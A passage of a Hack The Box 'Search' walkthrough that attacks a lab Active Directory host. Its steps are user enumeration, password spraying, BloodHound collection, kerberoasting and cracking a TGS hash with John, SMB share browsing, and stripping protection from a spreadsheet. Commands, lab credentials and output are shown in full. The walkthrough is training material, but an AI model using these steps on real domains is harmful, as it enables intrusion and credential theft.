+Chris.Stewart<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>-&gt; final list:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Hope.Sharp
+Keely.Lyons
+Dax.Santiago
+Sierra.Frye
+Kyla.Stewart
+Kaiara.Spencer
+Dave.Simpson
+Ben.Thompson
+Chris.Stewart
+HSharp
+KLyons
+DSantiago
+SFrye
+KStewart
+KSpencer
+DSimpson
+BThompson
+CStewart<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>THIS PART OF THE BOX I DIDN’T LIKE</strong><br>On the webserver there is a picture with a username and a password that is very important for us in order to continue with the box</p>
+<img src="/2022/05/01/search/20220501153623.png" class="">
+
+<p>-&gt; creds:<br><code>Hope Sharp:IsolationIsKey?</code><br>So keep that in mind and we will add it to our username list<br>With the password we could try some password spraying</p>
+<h6 id="Kerbrute-user-enumeration"><a href="#Kerbrute-user-enumeration" class="headerlink" title="Kerbrute: user enumeration"></a>Kerbrute: user enumeration</h6><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ /opt/kerbrute/kerbrute_linux_amd64 userenum <span class="token parameter variable">--dc</span> <span class="token number">10.10</span>.11.129 <span class="token parameter variable">-d</span> search.htb users.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ <span class="token punctuation">\</span>/ ___/ __ <span class="token punctuation">\</span>/ ___/ / / / __/ _ <span class="token punctuation">\</span>
+ / ,<span class="token operator">&lt;</span> /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>___/_/  /_.___/_/   <span class="token punctuation">\</span>__,_/<span class="token punctuation">\</span>__/<span class="token punctuation">\</span>___/                                        
+
+Version: v1.0.3 <span class="token punctuation">(</span>9dad6e1<span class="token punctuation">)</span> - 05/01/22 - Ronnie Flathers @ropnop
+
+<span class="token number">2022</span>/05/01 08:38:00 <span class="token operator">></span>  Using KDC<span class="token punctuation">(</span>s<span class="token punctuation">)</span>:
+<span class="token number">2022</span>/05/01 08:38:00 <span class="token operator">></span>   <span class="token number">10.10</span>.11.129:88
+
+<span class="token number">2022</span>/05/01 08:38:00 <span class="token operator">></span>  <span class="token punctuation">[</span>+<span class="token punctuation">]</span> VALID USERNAME:       Dax.Santiago@search.htb
+<span class="token number">2022</span>/05/01 08:38:00 <span class="token operator">></span>  <span class="token punctuation">[</span>+<span class="token punctuation">]</span> VALID USERNAME:       Hope.Sharp@search.htb
+<span class="token number">2022</span>/05/01 08:38:00 <span class="token operator">></span>  <span class="token punctuation">[</span>+<span class="token punctuation">]</span> VALID USERNAME:       Sierra.Frye@search.htb
+<span class="token number">2022</span>/05/01 08:38:00 <span class="token operator">></span>  <span class="token punctuation">[</span>+<span class="token punctuation">]</span> VALID USERNAME:       Keely.Lyons@search.htb
+<span class="token number">2022</span>/05/01 08:38:00 <span class="token operator">></span>  Done<span class="token operator">!</span> Tested <span class="token number">17</span> usernames <span class="token punctuation">(</span><span class="token number">4</span> valid<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token number">0.260</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h6 id="Kerbrute-password-spraying"><a href="#Kerbrute-password-spraying" class="headerlink" title="Kerbrute: password spraying"></a>Kerbrute: password spraying</h6><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ /opt/kerbrute/kerbrute_linux_amd64 passwordspray <span class="token parameter variable">--dc</span> <span class="token number">10.10</span>.11.129 <span class="token parameter variable">-d</span> search.htb users.txt <span class="token string">'IsolationIsKey?'</span>
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ <span class="token punctuation">\</span>/ ___/ __ <span class="token punctuation">\</span>/ ___/ / / / __/ _ <span class="token punctuation">\</span>
+ / ,<span class="token operator">&lt;</span> /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>___/_/  /_.___/_/   <span class="token punctuation">\</span>__,_/<span class="token punctuation">\</span>__/<span class="token punctuation">\</span>___/                                        
+
+Version: v1.0.3 <span class="token punctuation">(</span>9dad6e1<span class="token punctuation">)</span> - 05/01/22 - Ronnie Flathers @ropnop
+
+<span class="token number">2022</span>/05/01 08:39:04 <span class="token operator">></span>  Using KDC<span class="token punctuation">(</span>s<span class="token punctuation">)</span>:
+<span class="token number">2022</span>/05/01 08:39:04 <span class="token operator">></span>   <span class="token number">10.10</span>.11.129:88
+
+<span class="token number">2022</span>/05/01 08:39:04 <span class="token operator">></span>  <span class="token punctuation">[</span>+<span class="token punctuation">]</span> VALID LOGIN:  Hope.Sharp@search.htb:IsolationIsKey?
+<span class="token number">2022</span>/05/01 08:39:04 <span class="token operator">></span>  Done<span class="token operator">!</span> Tested <span class="token number">17</span> logins <span class="token punctuation">(</span><span class="token number">1</span> successes<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token number">0.550</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h6 id="Crackmapexec"><a href="#Crackmapexec" class="headerlink" title="Crackmapexec"></a>Crackmapexec</h6><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ crackmapexec smb <span class="token number">10.10</span>.11.129 <span class="token parameter variable">-u</span> hope.sharp <span class="token parameter variable">-p</span> <span class="token string">'IsolationIsKey?'</span>             
+
+SMB         <span class="token number">10.10</span>.11.129    <span class="token number">445</span>    RESEARCH         <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Windows <span class="token number">10.0</span> Build <span class="token number">17763</span> x64 <span class="token punctuation">(</span>name:RESEARCH<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain:search.htb<span class="token punctuation">)</span> <span class="token punctuation">(</span>signing:True<span class="token punctuation">)</span> <span class="token punctuation">(</span>SMBv1:False<span class="token punctuation">)</span>
+SMB         <span class="token number">10.10</span>.11.129    <span class="token number">445</span>    RESEARCH         <span class="token punctuation">[</span>+<span class="token punctuation">]</span>search.htb<span class="token punctuation">\</span>hope.sharp:IsolationIsKey?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h6 id="BloodHound-py"><a href="#BloodHound-py" class="headerlink" title="BloodHound.py"></a>BloodHound.py</h6><ol>
+<li>git clone <a target="_blank" rel="noopener" href="https://github.com/fox-it/BloodHound.py.git">https://github.com/fox-it/BloodHound.py.git</a></li>
+<li>python3 -m venv .venv</li>
+<li>source .venv&#x2F;bin&#x2F;activate</li>
+<li><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>.venv<span class="token punctuation">)</span><span class="token punctuation">(</span>iulian㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop/HackTheBox/Search/BloodHound.py<span class="token punctuation">]</span>
+└─$ pip3 <span class="token function">install</span> <span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
+<li>Run command: <code>python3 bloodhound.py -u hope.sharp -p &#39;IsolationIsKey?&#39; -d search.htb -ns 10.10.11.129 -c All</code></li>
+<li><code>sudo neo4j console</code></li>
+<li>Run BloodHound - neo4jneo4j</li>
+</ol>
+<p>Click on <strong>Upload Data</strong> and select all json files you need.</p>
+<img src="/2022/05/01/search/20220501155518.png" class="">
+
+<p>Start the Analysis</p>
+<img src="/2022/05/01/search/20220501155650.png" class="">
+
+<p>Using this we can find new users that we can add to our username list and try to password spray them with the password we found in the webserver.</p>
+<p>-&gt; username list:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rene.larson
+abby.gonzalez
+camren.luna
+sierra.frye
+keely.lyons<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Or let’s use some bash tricks:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> 20220501084503_users.json <span class="token operator">|</span> jq <span class="token string">'.data[].Properties | select(.enabled == true) | .name'</span> <span class="token parameter variable">-r</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>Also since we are here let’s try to find kerberoastable accounts and try to get the passwords.</p>
+<img src="/2022/05/01/search/20220501155840.png" class="">
+
+<p>In order to dump this user we can use the <strong>GetUserSPNs.py</strong> from <em>impacket</em></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ python3 /opt/impacket/examples/GetUserSPNs.py search.htb/hope.sharp:IsolationIsKey? <span class="token parameter variable">-outputfile</span> krb
+Impacket v0.9.23.dev1+20210528.195232.25c62f65 - Copyright <span class="token number">2020</span> SecureAuth Corporation
+
+ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
+---------------------------------  -------  --------  --------------------------  ---------  ----------
+RESEARCH/web_svc.search.htb:60001  web_svc            <span class="token number">2020</span>-04-09 08:59:11.329031  <span class="token operator">&lt;</span>never<span class="token operator">></span>               
+                   
+┌──<span class="token punctuation">(</span>iulian㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop/HackTheBox/Search<span class="token punctuation">]</span>
+└─$ <span class="token function">cat</span> krb                           
+<span class="token variable">$krb5tgs</span><span class="token variable">$23</span><span class="token variable">$*</span>web_svc<span class="token variable">$SEARCH</span>.HTB<span class="token variable">$search</span>.htb/web_svc*<span class="token variable">$4a40583dfd3bc180709123c2b3097931</span><span class="token variable">$9721ad06c859b94b43df9059daf18a5cdf6a771caeb98d1fc400e9ecd2346e22d74c85e7930d72264239df51b9b20a7fa0df1bf104d98b89633b126c5ccd47898769234e68c6793617d6beecc729fd775eda7d729149726f04f415c84ac4cda45d06f02c0a751f0eac517bfe8ed5182889330d8cec43ae808e149ee1e116490481f9345a6613828283fc5285aadcf510b94a38b2a024649e5d2fd95334aa496d172e540c450e7423205904a46d4b803ba7884fd7febc6f590431814818938cad128c5436a3398b42d4610504d08365b22e3bba2a36332e5e59c20e7c1a0f8e4ae8707411f4337813013891e1688d9de83cb062e98792a8d59c79066815e44e4bed4816ab3e27b04f3e6ff9986793806fe7b22632ba9e60a5a99c256dd2418bb02fedca24b982884f59bb525207a847972de5b749ca0c3a49360cadcfc6d17f09d77dfd553496af7a4aaa87831782e7ded82d2f238c3d2ca2ed7948976f2b38db6e249f4f9ddba0e7591595d9a285ebe782cb70755e001213ed520ecbe4085e033ae8128197a59f36d90cd38be281e4cd29488ab14fef4a7c5fb01d625a78bff05a0583c2ca6f8725483faafe71143f03afb96a6d393377315e51f8af871ea3bcca7614f3e28d5c14c8ed5776c631d8784c1cfd14852d40ef87b36c94ee57be0c0e9deb34e4ced2973f965ca2cb35c38ce970f0ebc870a97cdcdb80505a7a33c5c93fec25fc7f80561930131fb5634a13a4a8ec09a8845d91571b9399f83b3b618cdcdcc341299b9b7e46cedfe440911e3e594641eb0d7f1043538d2e2adb5909c6958edc4e1430c5d2651022c0f803f4135bc290925aae50afb3f2eafcc7ec442f97c2e59933ba1e95f9d9312faa11b56bffd4c56839c00be9e0bc4ea94185d42156ba07f6b251ec00339b4f296c082647a6a52e2cb23d6ad991734be370455990e2033bf7dc3e39cf92f6d17cf9f17a89f2aba8a4b1134d7c204085dfed05fe95b86ed8e05a3a8aae41cde3fa40215aefa0eaac7b837e87807dab6e3bc88bd484b3d743aec32cc5193f4484f00114bf57e21d0f228c3e0cd707d17e34a38f26c118d9eca1ba6bd40e90ebd907845cf09b660437a3701c3ccda789c46f94349aa6738da371f3cdd5215e61031672e764ec27a5aeb3949966c865d0ee249a64339eaa261db68878cc6ddb3c8d1776cbacf569a2f6a8821d0d84901edc93565f8ba06460b3c02be9ca772609e818012d124e60b34f4a606eaf376e0202418389c8058d1524f2116235f9f70ca2b562b0abb321b9baece0cd6bb70760920580760ae2f9912088313c1b978f6690dd38d5f548123cca0c5e82022c01dc1b4fef0a525bec10acfe91a3561ebe7b29b1d3c2c5d27413c0337f80b7e69094970de2ed144fb2bfb6091bfaf2bd4c76c5ea740aa90a108131f079a2b57500c5d866ff8135317ae76cc561581f88c61059878e2b5bfdccc87dac</span>              <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Let’s try to crack the hash ( <strong>@3ONEmillionbaby</strong> )</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ <span class="token function">sudo</span> john <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/rockyou.txt hash.hash 
+<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> iulian: 
+Using default input encoding: UTF-8
+Loaded <span class="token number">1</span> password <span class="token builtin class-name">hash</span> <span class="token punctuation">(</span>krb5tgs, Kerberos <span class="token number">5</span> TGS etype <span class="token number">23</span> <span class="token punctuation">[</span>MD4 HMAC-MD5 RC4<span class="token punctuation">]</span><span class="token punctuation">)</span>
+Will run <span class="token number">12</span> OpenMP threads
+Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
+@3ONEmillionbaby <span class="token punctuation">(</span>?<span class="token punctuation">)</span>
+1g <span class="token number">0</span>:00:00:04 DONE <span class="token punctuation">(</span><span class="token number">2022</span>-05-01 09:01<span class="token punctuation">)</span> <span class="token number">0</span>.2183g/s 2509Kp/s 2509Kc/s 2509KC/s @421eduymayte619<span class="token punctuation">..</span><span class="token operator">=</span>12_ffl
+Use the <span class="token string">"--show"</span> option to display all of the cracked passwords reliably
+Session completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>-&gt; password sparying with the new users:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ /opt/kerbrute/kerbrute_linux_amd64 passwordspray <span class="token parameter variable">--dc</span> <span class="token number">10.10</span>.11.129 <span class="token parameter variable">-d</span> search.htb usernames.txt <span class="token string">'@3ONEmillionbaby'</span>
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ <span class="token punctuation">\</span>/ ___/ __ <span class="token punctuation">\</span>/ ___/ / / / __/ _ <span class="token punctuation">\</span>
+ / ,<span class="token operator">&lt;</span> /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>___/_/  /_.___/_/   <span class="token punctuation">\</span>__,_/<span class="token punctuation">\</span>__/<span class="token punctuation">\</span>___/                                        
+
+Version: v1.0.3 <span class="token punctuation">(</span>9dad6e1<span class="token punctuation">)</span> - 05/01/22 - Ronnie Flathers @ropnop
+
+<span class="token number">2022</span>/05/01 09:17:25 <span class="token operator">></span>  Using KDC<span class="token punctuation">(</span>s<span class="token punctuation">)</span>:
+<span class="token number">2022</span>/05/01 09:17:25 <span class="token operator">></span>   <span class="token number">10.10</span>.11.129:88
+
+<span class="token number">2022</span>/05/01 09:17:26 <span class="token operator">></span>  <span class="token punctuation">[</span>+<span class="token punctuation">]</span> VALID LOGIN:  WEB_SVC@search.htb:@3ONEmillionbaby
+<span class="token number">2022</span>/05/01 09:17:28 <span class="token operator">></span>  <span class="token punctuation">[</span>+<span class="token punctuation">]</span> VALID LOGIN:  EDGAR.JACOBS@search.htb:@3ONEmillionbaby
+<span class="token number">2022</span>/05/01 09:17:29 <span class="token operator">></span>  Done<span class="token operator">!</span> Tested <span class="token number">104</span> logins <span class="token punctuation">(</span><span class="token number">2</span> successes<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token number">3.268</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h6 id="SMB-Enumeration"><a href="#SMB-Enumeration" class="headerlink" title="SMB Enumeration"></a>SMB Enumeration</h6><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ smbmap <span class="token parameter variable">-u</span> edgar.jacobs <span class="token parameter variable">-p</span> <span class="token string">'@3ONEmillionbaby'</span> <span class="token parameter variable">-H</span> <span class="token number">10.10</span>.11.129                                                                                                                      <span class="token number">130</span> ⨯
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> IP: <span class="token number">10.10</span>.11.129:445        Name: search.htb                                        
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        CertEnroll                                              READ ONLY       Active Directory Certificate Services share
+        helpdesk                                                READ ONLY
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        RedirectedFolders$                                      READ, WRITE
+        SYSVOL                                                  READ ONLY       Logon server share <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Connect with edgar.jacobs to <strong>SMB</strong></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ smbclient <span class="token parameter variable">-U</span> edgar.jacobs <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">10.10</span>.11.129<span class="token punctuation">\</span><span class="token punctuation">\</span>RedirectedFolders$
+Enter WORKGROUP<span class="token punctuation">\</span>edgar.jacobs's password: 
+Try <span class="token string">"help"</span> to get a list of possible commands.
+smb: <span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">dir</span>
+  <span class="token builtin class-name">.</span>                                  Dc        <span class="token number">0</span>  Sun May  <span class="token number">1</span> 09:21:19 <span class="token number">2022</span>
+  <span class="token punctuation">..</span>                                 Dc        <span class="token number">0</span>  Sun May  <span class="token number">1</span> 09:21:19 <span class="token number">2022</span>
+  abril.suarez                       Dc        <span class="token number">0</span>  Tue Apr  <span class="token number">7</span> <span class="token number">14</span>:12:58 <span class="token number">2020</span>
+  Angie.Duffy                        Dc        <span class="token number">0</span>  Fri Jul <span class="token number">31</span> 09:11:32 <span class="token number">2020</span>
+  Antony.Russo                       Dc        <span class="token number">0</span>  Fri Jul <span class="token number">31</span> 08:35:32 <span class="token number">2020</span>
+  belen.compton                      Dc        <span class="token number">0</span>  Tue Apr  <span class="token number">7</span> <span class="token number">14</span>:32:31 <span class="token number">2020</span>
+  Cameron.Melendez                   Dc        <span class="token number">0</span>  Fri Jul <span class="token number">31</span> 08:37:36 <span class="token number">2020</span>
+  chanel.bell                        Dc        <span class="token number">0</span>  Tue Apr  <span class="token number">7</span> <span class="token number">14</span>:15:09 <span class="token number">2020</span>
+  Claudia.Pugh                       Dc        <span class="token number">0</span>  Fri Jul <span class="token number">31</span> 09:09:08 <span class="token number">2020</span>
+  Cortez.Hickman                     Dc        <span class="token number">0</span>  Fri Jul <span class="token number">31</span> 08:02:04 <span class="token number">2020</span>
+  dax.santiago                       Dc        <span class="token number">0</span>  Tue Apr  <span class="token number">7</span> <span class="token number">14</span>:20:08 <span class="token number">2020</span>
+  Eddie.Stevens                      Dc        <span class="token number">0</span>  Fri Jul <span class="token number">31</span> 07:55:34 <span class="token number">2020</span>
+  edgar.jacobs                       Dc        <span class="token number">0</span>  Thu Apr  <span class="token number">9</span> <span class="token number">16</span>:04:11 <span class="token number">2020</span>
+  Edith.Walls                        Dc        <span class="token number">0</span>  Fri Jul <span class="token number">31</span> 08:39:50 <span class="token number">2020</span>
+  eve.galvan                         Dc        <span class="token number">0</span>  Tue Apr  <span class="token number">7</span> <span class="token number">14</span>:23:13 <span class="token number">2020</span>
+  frederick.cuevas                   Dc        <span class="token number">0</span>  Tue Apr  <span class="token number">7</span> <span class="token number">14</span>:29:22 <span class="token number">2020</span>
+  hope.sharp                         Dc        <span class="token number">0</span>  Thu Apr  <span class="token number">9</span> <span class="token number">10</span>:34:41 <span class="token number">2020</span>
+  jayla.roberts                      Dc        <span class="token number">0</span>  Tue Apr  <span class="token number">7</span> <span class="token number">14</span>:07:00 <span class="token number">2020</span>
+  Jordan.Gregory                     Dc        <span class="token number">0</span>  Fri Jul <span class="token number">31</span> 09:01:06 <span class="token number">2020</span>
+  payton.harmon                      Dc        <span class="token number">0</span>  Thu Apr  <span class="token number">9</span> <span class="token number">16</span>:11:39 <span class="token number">2020</span>
+  Reginald.Morton                    Dc        <span class="token number">0</span>  Fri Jul <span class="token number">31</span> 07:44:32 <span class="token number">2020</span>
+  santino.benjamin                   Dc        <span class="token number">0</span>  Tue Apr  <span class="token number">7</span> <span class="token number">14</span>:10:25 <span class="token number">2020</span>
+  Savanah.Velazquez                  Dc        <span class="token number">0</span>  Fri Jul <span class="token number">31</span> 08:21:42 <span class="token number">2020</span>
+  sierra.frye                        Dc        <span class="token number">0</span>  Wed Nov <span class="token number">17</span> <span class="token number">20</span>:01:46 <span class="token number">2021</span>
+  trace.ryan                         Dc        <span class="token number">0</span>  Thu Apr  <span class="token number">9</span> <span class="token number">16</span>:14:26 <span class="token number">2020</span>
+
+                <span class="token number">3246079</span> blocks of size <span class="token number">4096</span>. <span class="token number">498712</span> blocks available
+smb: <span class="token punctuation">\</span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>In the <em>Desktop</em> folder that edgar has we found a xlsx file ( EXCEL )</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">smb: <span class="token punctuation">\</span>edgar.jacobs<span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">dir</span> Desktop<span class="token punctuation">\</span>
+  <span class="token builtin class-name">.</span>                                 DRc        <span class="token number">0</span>  Mon Aug <span class="token number">10</span> 06:02:16 <span class="token number">2020</span>
+  <span class="token punctuation">..</span>                                DRc        <span class="token number">0</span>  Mon Aug <span class="token number">10</span> 06:02:16 <span class="token number">2020</span>
+  <span class="token variable">$RECYCLE</span>.BIN                     DHSc        <span class="token number">0</span>  Thu Apr  <span class="token number">9</span> <span class="token number">16</span>:05:29 <span class="token number">2020</span>
+  desktop.ini                      AHSc      <span class="token number">282</span>  Mon Aug <span class="token number">10</span> 06:02:16 <span class="token number">2020</span>
+  Microsoft Edge.lnk                 Ac     <span class="token number">1450</span>  Thu Apr  <span class="token number">9</span> <span class="token number">16</span>:05:03 <span class="token number">2020</span>
+  Phishing_Attempt.xlsx              Ac    <span class="token number">23130</span>  Mon Aug <span class="token number">10</span> 06:35:44 <span class="token number">2020</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Let’s download it and look more into it.<br>Use <strong>libreoffice</strong> in order to open it faster.</p>
+<img src="/2022/05/01/search/20220501163334.png" class="">
+<p>As you can see the cells are protected.<br>So in order to do that we can modify the document and delete a specific blob that could let us view the column C cells.<br><strong>THIS IS ONLY POSSIBLE IF THE DOCUMENT IS NOT ENCRYPTED</strong></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ <span class="token function">unzip</span> Phishing_Attempt.xlsx 
+Archive:  Phishing_Attempt.xlsx
+  inflating: <span class="token punctuation">[</span>Content_Types<span class="token punctuation">]</span>.xml     
+  inflating: _rels/.rels             
+  inflating: xl/workbook.xml         
+  inflating: xl/_rels/workbook.xml.rels  
+  inflating: xl/worksheets/sheet1.xml  
+  inflating: xl/worksheets/sheet2.xml  
+  inflating: xl/theme/theme1.xml     
+  inflating: xl/styles.xml           
+  inflating: xl/sharedStrings.xml    
+  inflating: xl/drawings/drawing1.xml  
+  inflating: xl/charts/chart1.xml    
+  inflating: xl/charts/style1.xml    
+  inflating: xl/charts/colors1.xml   
+  inflating: xl/worksheets/_rels/sheet1.xml.rels  
+  inflating: xl/worksheets/_rels/sheet2.xml.rels  
+  inflating: xl/drawings/_rels/drawing1.xml.rels  
+  inflating: xl/charts/_rels/chart1.xml.rels  
+  inflating: xl/printerSettings/printerSettings1.bin  
+  inflating: xl/printerSettings/printerSettings2.bin  
+  inflating: xl/calcChain.xml        
+  inflating: docProps/core.xml       
+  inflating: docProps/app.xml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Look on sheet2.xml because we saw in libreoffice that it’s on the 2nd sheet, nano it and delete the entire <strong>sheetProtection</strong> tag.<br>After that zip the files and open the document again.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ <span class="token function">zip</span> phis.xlsx <span class="token parameter variable">-r</span> <span class="token builtin class-name">.</span>     
+  adding: docProps/ <span class="token punctuation">(</span>stored <span class="token number">0</span>%<span class="token punctuation">)</span>
+  adding: docProps/core.xml <span class="token punctuation">(</span>deflated <span class="token number">47</span>%<span class="token punctuation">)</span>
+  adding: docProps/app.xml <span class="token punctuation">(</span>deflated <span class="token number">52</span>%<span class="token punctuation">)</span>
+  adding: _rels/ <span class="token punctuation">(</span>stored <span class="token number">0</span>%<span class="token punctuation">)</span>
+  adding: _rels/.rels <span class="token punctuation">(</span>deflated <span class="token number">60</span>%<span class="token punctuation">)</span>
+  adding: <span class="token punctuation">[</span>Content_Types<span class="token punctuation">]</span>.xml <span class="token punctuation">(</span>deflated <span class="token number">79</span>%<span class="token punctuation">)</span>
+  adding: Phishing_Attempt.xlsx <span class="token punctuation">(</span>deflated <span class="token number">23</span>%<span class="token punctuation">)</span>
+  adding: xl/ <span class="token punctuation">(</span>stored <span class="token number">0</span>%<span class="token punctuation">)</span>
+  adding: xl/printerSettings/ <span class="token punctuation">(</span>stored <span class="token number">0</span>%<span class="token punctuation">)</span>
+  adding: xl/printerSettings/printerSettings1.bin <span class="token punctuation">(</span>deflated <span class="token number">67</span>%<span class="token punctuation">)</span>
+  adding: xl/printerSettings/printerSettings2.bin <span class="token punctuation">(</span>deflated <span class="token number">67</span>%<span class="token punctuation">)</span>
+  adding: xl/workbook.xml <span class="token punctuation">(</span>deflated <span class="token number">60</span>%<span class="token punctuation">)</span>
+  adding: xl/theme/ <span class="token punctuation">(</span>stored <span class="token number">0</span>%<span class="token punctuation">)</span>
+  adding: xl/theme/theme1.xml <span class="token punctuation">(</span>deflated <span class="token number">80</span>%<span class="token punctuation">)</span>
+  adding: xl/styles.xml <span class="token punctuation">(</span>deflated <span class="token number">89</span>%<span class="token punctuation">)</span>
+  adding: xl/drawings/ <span class="token punctuation">(</span>stored <span class="token number">0</span>%<span class="token punctuation">)</span>
+  adding: xl/drawings/_rels/ <span class="token punctuation">(</span>stored <span class="token number">0</span>%<span class="token punctuation">)</span>
+  adding: xl/drawings/_rels/drawing1.xml.rels <span class="token punctuation">(</span>deflated <span class="token number">39</span>%<span class="token punctuation">)</span>
+  adding: xl/drawings/drawing1.xml <span class="token punctuation">(</span>deflated <span class="token number">58</span>%<span class="token punctuation">)</span>
+  adding: xl/charts/ <span class="token punctuation">(</span>stored <span class="token number">0</span>%<span class="token punctuation">)</span>
+  adding: xl/charts/colors1.xml <span class="token punctuation">(</span>deflated <span class="token number">73</span>%<span class="token punctuation">)</span>
+  adding: xl/charts/_rels/ <span class="token punctuation">(</span>stored <span class="token number">0</span>%<span class="token punctuation">)</span>
+  adding: xl/charts/_rels/chart1.xml.rels <span class="token punctuation">(</span>deflated <span class="token number">49</span>%<span class="token punctuation">)</span>
+  adding: xl/charts/style1.xml <span class="token punctuation">(</span>deflated <span class="token number">90</span>%<span class="token punctuation">)</span>
+  adding: xl/charts/chart1.xml <span class="token punctuation">(</span>deflated <span class="token number">77</span>%<span class="token punctuation">)</span>
+  adding: xl/_rels/ <span class="token punctuation">(</span>stored <span class="token number">0</span>%<span class="token punctuation">)</span>
+  adding: xl/_rels/workbook.xml.rels <span class="token punctuation">(</span>deflated <span class="token number">74</span>%<span class="token punctuation">)</span>
+  adding: xl/worksheets/ <span class="token punctuation">(</span>stored <span class="token number">0</span>%<span class="token punctuation">)</span>
+  adding: xl/worksheets/sheet2.xml <span class="token punctuation">(</span>deflated <span class="token number">73</span>%<span class="token punctuation">)</span>
+  adding: xl/worksheets/_rels/ <span class="token punctuation">(</span>stored <span class="token number">0</span>%<span class="token punctuation">)</span>
+  adding: xl/worksheets/_rels/sheet1.xml.rels <span class="token punctuation">(</span>deflated <span class="token number">55</span>%<span class="token punctuation">)</span>
+  adding: xl/worksheets/_rels/sheet2.xml.rels <span class="token punctuation">(</span>deflated <span class="token number">42</span>%<span class="token punctuation">)</span>
+  adding: xl/worksheets/sheet1.xml <span class="token punctuation">(</span>deflated <span class="token number">79</span>%<span class="token punctuation">)</span>
